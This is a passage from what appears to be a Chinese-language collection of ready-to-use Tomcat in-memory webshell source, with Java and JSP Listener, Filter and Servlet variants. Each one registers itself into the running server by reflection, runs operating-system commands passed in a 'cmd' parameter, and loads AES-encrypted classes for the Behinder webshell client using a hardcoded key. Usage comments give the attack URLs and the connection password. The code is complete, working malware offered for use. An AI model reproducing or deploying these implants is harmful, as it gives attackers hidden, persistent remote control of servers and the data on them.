            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
            TLbx myListener = new TLbx();

            standardContext.addApplicationEventListener(myListener);


        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        try {
            RequestFacade requestFacade = (RequestFacade) servletRequestEvent.getServletRequest();
            Field getRequestField = requestFacade.getClass().getDeclaredField("request");
            getRequestField.setAccessible(true);
            Request request = (Request) getRequestField.get(requestFacade);
            Response response = request.getResponse();
            HttpSession  session = request.getSession();
            Map<String, Object> pageContext = new HashMap<String, Object>();
            pageContext.put("session", session);
            pageContext.put("request", request);
            pageContext.put("response", response);

            String command = request.getParameter("cmd");
            if (command != null){
                String system = System.getProperty("os.name");
                if (system.toLowerCase().contains("win")) {
                    Process process = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",command});
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    StringBuilder stringBuilder = new StringBuilder();
                    String line;
                    while ((line = bufferedReader.readLine()) != null) {
                        stringBuilder.append(line + '\n');
                    }

                    response.getOutputStream().write(stringBuilder.toString().getBytes());
                    response.getOutputStream().flush();
                    response.getOutputStream().close();
                } else {
                    Process process = Runtime.getRuntime().exec(new String[]{"bash","-c",command});
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    StringBuilder stringBuilder = new StringBuilder();
                    String line;
                    while ((line = bufferedReader.readLine()) != null) {
                        stringBuilder.append(line + '\n');
                    }

                    response.getOutputStream().write(stringBuilder.toString().getBytes());
                    response.getOutputStream().flush();
                    response.getOutputStream().close();
                }
            }
            ClassLoader cl = (ClassLoader) Thread.currentThread().getContextClassLoader();

            if (request.getMethod().equals("POST")) {
                if (cl.getClass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    //从java.lang.ClassLoader中获取到Class对象
                    Class Lclass = cl.getClass().getSuperclass();
                    //调用RushThere()方法，注入内存马
                    RushThere(Lclass, cl, session, request, pageContext);
                } else if (cl.getClass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Class Lclass = cl.getClass().getSuperclass().getSuperclass();
                    RushThere(Lclass, cl, session, request, pageContext);
                } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass();
                    RushThere(Lclass, cl, session, request, pageContext);
                } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                    RushThere(Lclass, cl, session, request, pageContext);
                } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                    RushThere(Lclass, cl, session, request, pageContext);
                } else {
                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                    RushThere(Lclass, cl, session, request, pageContext);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
    public void RushThere(Class Lclass, ClassLoader cl, HttpSession session, HttpServletRequest request,Map<String, Object> pageContext){
        byte[] bytecode = java.util.Base64.getDecoder().decode("yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT");
        try {

            Method define = Lclass.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            define.setAccessible(true);
            Class uclass = null;
            try {
                uclass = cl.loadClass("U");
            } catch (ClassNotFoundException e) {
                uclass = (Class) define.invoke(cl, bytecode, 0, bytecode.length);
            }
            Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);
            constructor.setAccessible(true);
            Object u = constructor.newInstance(this.getClass().getClassLoader());
            Method Um = uclass.getDeclaredMethod("g", byte[].class);
            Um.setAccessible(true);
            String k = passwd;
            session.setAttribute("u", k);
            Cipher c = Cipher.getInstance("AES");
            c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
            byte[] eClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
            Class eclass = (Class) Um.invoke(u, eClassBytes);
            Object a = eclass.newInstance();
            Method b = eclass.getDeclaredMethod("equals", Object.class);
            b.setAccessible(true);
            b.invoke(a, pageContext);
        }catch (Exception e){
            e.printStackTrace();
        }
    }


    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {

    }


}

```
### 3.1.2、Filter
```
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

/**
 * 不用改了
 * 标准的cmd内存马&冰蝎马
 * 用法:
 *  1、执行命令：http://xxx.xxx.xxx.x/?cmd=whoami
 *  2、冰蝎连接：http://xxx.xxx.xxx.x/ 密码：lan
 *
 * 2023/08/03
 */
public class TFbx extends ClassLoader implements Filter{

    String passwd = "73f50c9f17291ce9";

    static {
        try {
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            Filter myFilter = new TFbx();
            String filterName = "lan";


            FilterDef filterDef = new FilterDef();
            filterDef.setFilterName(filterName);
            filterDef.setFilterClass(myFilter.getClass().getName());
            filterDef.setFilter(myFilter);
            filterDef.setAsyncSupported("true");
            standardContext.addFilterDef(filterDef);

            FilterMap filterMap = new FilterMap();
            filterMap.addURLPattern("/");
            filterMap.setFilterName(filterName);
            filterMap.setDispatcher(DispatcherType.REQUEST.name());
            standardContext.addFilterMap(filterMap);

            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

            Field filterConfigsField = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("filterConfigs");
            filterConfigsField.setAccessible(true);
            HashMap filterConfigs = (HashMap) filterConfigsField.get(standardContext);

            filterConfigs.put(filterName,filterConfig);


        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        String command = servletRequest.getParameter("cmd");
        if (command != null){
            String system = System.getProperty("os.name");
            if (system.toLowerCase().contains("win")) {
                Process process = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",command});
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }

                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
                servletResponse.getOutputStream().flush();
                servletResponse.getOutputStream().close();
            } else {
                Process process = Runtime.getRuntime().exec(new String[]{"bash","-c",command});
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }

                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
                servletResponse.getOutputStream().flush();
                servletResponse.getOutputStream().close();
            }
        }

        HttpServletRequest request = (HttpServletRequest) servletRequest;
        HttpServletResponse response = (HttpServletResponse) servletResponse;
        HttpSession session = request.getSession();

        Map<String, Object> pageContext = new HashMap<String, Object>();
        pageContext.put("session", session);
        pageContext.put("request", request);
        pageContext.put("response", response);

        ClassLoader cl = (ClassLoader) Thread.currentThread().getContextClassLoader();

        if (request.getMethod().equals("POST")) {
            if (cl.getClass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                //从java.lang.ClassLoader中获取到Class对象
                Class Lclass = cl.getClass().getSuperclass();
                //调用RushThere()方法，注入内存马
                RushThere(Lclass, cl, session, request, pageContext);
            } else if (cl.getClass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            } else {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            }
            filterChain.doFilter(servletRequest, servletResponse);
        }
        filterChain.doFilter(servletRequest,servletResponse);
    }

    public void RushThere(Class Lclass, ClassLoader cl, HttpSession session, HttpServletRequest request,Map<String, Object> pageContext){
        byte[] bytecode = java.util.Base64.getDecoder().decode("yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT");
        try {

            Method define = Lclass.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            define.setAccessible(true);
            Class uclass = null;
            try {
                uclass = cl.loadClass("U");
            } catch (ClassNotFoundException e) {
                uclass = (Class) define.invoke(cl, bytecode, 0, bytecode.length);
            }
            Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);
            constructor.setAccessible(true);
            Object u = constructor.newInstance(this.getClass().getClassLoader());
            Method Um = uclass.getDeclaredMethod("g", byte[].class);
            Um.setAccessible(true);
            String k = passwd;
            session.setAttribute("u", k);
            Cipher c = Cipher.getInstance("AES");
            c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
            byte[] eClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
            Class eclass = (Class) Um.invoke(u, eClassBytes);
            Object a = eclass.newInstance();
            Method b = eclass.getDeclaredMethod("equals", Object.class);
            b.setAccessible(true);
            b.invoke(a, pageContext);
        }catch (Exception e){
            e.printStackTrace();
        }
    }




    @Override
    public void destroy() {

    }
}

```
### 3.1.3、Servlet
```
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

/**
 * 不用改了
 * 标准的cmd内存马&冰蝎马
 * 用法:
 *  1、执行命令：http://xxx.xxx.xxx.x/?cmd=whoami
 *  2、冰蝎连接：http://xxx.xxx.xxx.x/lan 密码：lan
 *
 * 2023/08/03
 */

public class TSbx implements Servlet {
    String passwd = "73f50c9f17291ce9";
    static {
        try {
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            TSbx myServlet = new TSbx();

            String name = myServlet.getClass().getSimpleName();

            Wrapper wrapper = standardContext.createWrapper();
            wrapper.setName(name);
            wrapper.setServlet(myServlet);

            standardContext.addChild(wrapper);
            standardContext.addServletMappingDecoded("/lan",name);


        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void init(ServletConfig servletConfig) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        String command = servletRequest.getParameter("cmd");
        if (command != null){
            String system = System.getProperty("os.name");
            if (system.toLowerCase().contains("win")) {
                Process process = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",command});
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }

                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
                servletResponse.getOutputStream().flush();
                servletResponse.getOutputStream().close();
            } else {
                Process process = Runtime.getRuntime().exec(new String[]{"bash","-c",command});
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }

                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
                servletResponse.getOutputStream().flush();
                servletResponse.getOutputStream().close();
            }
        }

        HttpServletRequest request = (HttpServletRequest) servletRequest;
        HttpServletResponse response = (HttpServletResponse) servletResponse;
        HttpSession session = request.getSession();

        Map<String, Object> pageContext = new HashMap<String, Object>();
        pageContext.put("session", session);
        pageContext.put("request", request);
        pageContext.put("response", response);

        ClassLoader cl = (ClassLoader) Thread.currentThread().getContextClassLoader();

        if (request.getMethod().equals("POST")) {
            if (cl.getClass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                //从java.lang.ClassLoader中获取到Class对象
                Class Lclass = cl.getClass().getSuperclass();
                //调用RushThere()方法，注入内存马
                RushThere(Lclass, cl, session, request, pageContext);
            } else if (cl.getClass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            } else {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            }
        }
    }

    public void RushThere(Class Lclass, ClassLoader cl, HttpSession session, HttpServletRequest request,Map<String, Object> pageContext){
        byte[] bytecode = java.util.Base64.getDecoder().decode("yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT");
        try {

            Method define = Lclass.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            define.setAccessible(true);
            Class uclass = null;
            try {
                uclass = cl.loadClass("U");
            } catch (ClassNotFoundException e) {
                uclass = (Class) define.invoke(cl, bytecode, 0, bytecode.length);
            }
            Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);
            constructor.setAccessible(true);
            Object u = constructor.newInstance(this.getClass().getClassLoader());
            Method Um = uclass.getDeclaredMethod("g", byte[].class);
            Um.setAccessible(true);
            String k = passwd;
            session.setAttribute("u", k);
            Cipher c = Cipher.getInstance("AES");
            c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
            byte[] eClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
            Class eclass = (Class) Um.invoke(u, eClassBytes);
            Object a = eclass.newInstance();
            Method b = eclass.getDeclaredMethod("equals", Object.class);
            b.setAccessible(true);
            b.invoke(a, pageContext);
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }
}


```
## 3.2、jsp源码
### 3.2.1、Listener
```
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.connector.RequestFacade" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="javax.crypto.Cipher" %>
<%@ page import="javax.crypto.spec.SecretKeySpec" %>
<%@page language="java" contentType="text/html; charset=UTF-8" %>

<%--
/**
 * 不用改了
 * 标准的cmd内存马&冰蝎马
 * 用法:
 *  1、执行命令：http://xxx.xxx.xxx.x/?cmd=whoami
 *  2、冰蝎连接：http://xxx.xxx.xxx.x/ 密码：lan
 *
 * 2023/08/03
 */
--%>
<%
    class LanListener implements ServletRequestListener {

        String passwd = "73f50c9f17291ce9";

        @Override
        public void requestInitialized(ServletRequestEvent sre) {
            try {
                RequestFacade requestFacade = (RequestFacade) sre.getServletRequest();
                Field getRequestField = requestFacade.getClass().getDeclaredField("request");
                getRequestField.setAccessible(true);
                Request request = (Request) getRequestField.get(requestFacade);
                Response response = request.getResponse();
                HttpSession  session = request.getSession();
                Map<String, Object> pageContext = new HashMap<String, Object>();
                pageContext.put("session", session);
                pageContext.put("request", request);
                pageContext.put("response", response);

                String command = request.getParameter("cmd");
                if (command != null){
                    String system = System.getProperty("os.name");
                    if (system.toLowerCase().contains("win")) {
                        Process process = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",command});
                        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                        StringBuilder stringBuilder = new StringBuilder();
                        String line;
                        while ((line = bufferedReader.readLine()) != null) {
                            stringBuilder.append(line + '\n');
                        }

                        response.getOutputStream().write(stringBuilder.toString().getBytes());
                        response.getOutputStream().flush();
                        response.getOutputStream().close();
                    } else {
                        Process process = Runtime.getRuntime().exec(new String[]{"bash","-c",command});
                        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                        StringBuilder stringBuilder = new StringBuilder();
                        String line;
                        while ((line = bufferedReader.readLine()) != null) {
                            stringBuilder.append(line + '\n');
                        }

                        response.getOutputStream().write(stringBuilder.toString().getBytes());
                        response.getOutputStream().flush();
                        response.getOutputStream().close();
                    }
                }
                ClassLoader cl = (ClassLoader) Thread.currentThread().getContextClassLoader();

                if (request.getMethod().equals("POST")) {
                    if (cl.getClass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                        Class Lclass = cl.getClass().getSuperclass();
                        RushThere(Lclass, cl, session, request, pageContext);
                    } else if (cl.getClass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                        Class Lclass = cl.getClass().getSuperclass().getSuperclass();
                        RushThere(Lclass, cl, session, request, pageContext);
                    } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                        Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass();
                        RushThere(Lclass, cl, session, request, pageContext);
                    } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                        Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                        RushThere(Lclass, cl, session, request, pageContext);
                    } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                        Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                        RushThere(Lclass, cl, session, request, pageContext);
                    } else {
                        Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                        RushThere(Lclass, cl, session, request, pageContext);
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        public void RushThere(Class Lclass, ClassLoader cl, HttpSession session, HttpServletRequest request,Map<String, Object> pageContext){
            byte[] bytecode = java.util.Base64.getDecoder().decode("yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT");
            try {

                Method define = Lclass.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                define.setAccessible(true);
                Class uclass = null;
                try {
                    uclass = cl.loadClass("U");
                } catch (ClassNotFoundException e) {
                    uclass = (Class) define.invoke(cl, bytecode, 0, bytecode.length);
                }
                Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);
                constructor.setAccessible(true);
                Object u = constructor.newInstance(this.getClass().getClassLoader());
                Method Um = uclass.getDeclaredMethod("g", byte[].class);
                Um.setAccessible(true);
                String k = passwd;
                session.setAttribute("u", k);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                byte[] eClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
                Class eclass = (Class) Um.invoke(u, eClassBytes);
                Object a = eclass.newInstance();
                Method b = eclass.getDeclaredMethod("equals", Object.class);
                b.setAccessible(true);
                b.invoke(a, pageContext);
            }catch (Exception e){
                e.printStackTrace();
            }
        }

        @Override
        public void requestDestroyed(ServletRequestEvent sre) {
        }
    }

    LanListener lanListener = new LanListener();
%>

<%
    RequestFacade requestFacade = (RequestFacade) request;
    Class requestFacadeClass = requestFacade.getClass();
    Field getRequestField = requestFacadeClass.getDeclaredField("request");
    getRequestField.setAccessible(true);
    Request getRequest = (Request) getRequestField.get(requestFacade);
    StandardContext standardContext = (StandardContext) getRequest.getContext();
    standardContext.addApplicationEventListener(lanListener);
%>

```
### 3.2.2、Filter
```
<%@ page import="org.apache.catalina.connector.RequestFacade" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="javax.crypto.Cipher" %>
<%@ page import="javax.crypto.spec.SecretKeySpec" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@page language="java" contentType="text/html; charset=UTF-8" %>

<%--
/**
 * 不用改了
 * 标准的cmd内存马&冰蝎马
 * 用法:
 *  1、执行命令：http://xxx.xxx.xxx.x/?cmd=whoami
 *  2、冰蝎连接：http://xxx.xxx.xxx.x/ 密码：lan
 *
 * 2023/08/03
 */
--%>
<%
    class LanMyFilter implements Filter {

        String passwd = "73f50c9f17291ce9";

        @Override
        public void init(FilterConfig filterConfig) throws ServletException {
        }

        @Override
        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
            String command = servletRequest.getParameter("cmd");
            if (command != null){
                String system = System.getProperty("os.name");
                if (system.toLowerCase().contains("win")) {
                    Process process = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",command});
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    StringBuilder stringBuilder = new StringBuilder();
                    String line;
                    while ((line = bufferedReader.readLine()) != null) {
                        stringBuilder.append(line + '\n');
                    }

                    servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
                    servletResponse.getOutputStream().flush();
                    servletResponse.getOutputStream().close();
                } else {
                    Process process = Runtime.getRuntime().exec(new String[]{"bash","-c",command});
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    StringBuilder stringBuilder = new StringBuilder();
                    String line;
                    while ((line = bufferedReader.readLine()) != null) {
                        stringBuilder.append(line + '\n');
                    }

                    servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
                    servletResponse.getOutputStream().flush();
                    servletResponse.getOutputStream().close();
                }
            }

            HttpServletRequest request = (HttpServletRequest) servletRequest;
            HttpServletResponse response = (HttpServletResponse) servletResponse;
            HttpSession session = request.getSession();

            Map<String, Object> pageContext = new HashMap<String, Object>();
            pageContext.put("session", session);
            pageContext.put("request", request);
            pageContext.put("response", response);

            ClassLoader cl = (ClassLoader) Thread.currentThread().getContextClassLoader();

            if (request.getMethod().equals("POST")) {
